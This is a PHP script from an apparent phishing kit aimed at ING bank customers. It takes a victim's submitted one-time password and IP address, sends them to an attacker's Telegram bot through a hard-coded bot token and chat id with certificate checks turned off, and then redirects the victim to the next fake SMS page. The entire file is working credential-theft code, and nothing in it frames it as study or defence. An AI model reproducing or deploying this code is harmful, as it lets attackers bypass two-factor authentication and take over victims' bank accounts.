<?php
$Xzour = getenv("REMOTE_ADDR");

$message .= "--++-----[ OTP 2 ]-----++--\n";

$message .= "OTP 2: ".$_POST['OTP2']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $Xzour\n";
$subject = "Log ING By xzour [ " . $Xzour . " ] ";
$website="https://api.telegram.org/bot5044466536:AAEh9MC8hsbWkxk78NtQeWtng25Yx4r1Zfg";
$chatId=1305831045;  //Receiver Chat Id 
$params=[
    'chat_id'=>'1305831045',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

 header("Location: ./SMS3.php");

?>

